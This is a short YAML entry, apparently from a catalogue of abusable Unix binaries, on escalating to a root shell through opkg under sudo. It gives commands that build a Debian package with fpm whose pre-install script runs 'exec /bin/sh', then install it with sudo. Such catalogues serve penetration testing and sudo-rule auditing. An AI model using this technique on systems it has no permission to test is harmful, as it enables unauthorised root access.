---
functions:
  sudo:
    - description: |
        It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'exec /bin/sh' > $TF/x.sh
        fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo opkg install x_1.0_all.deb
---
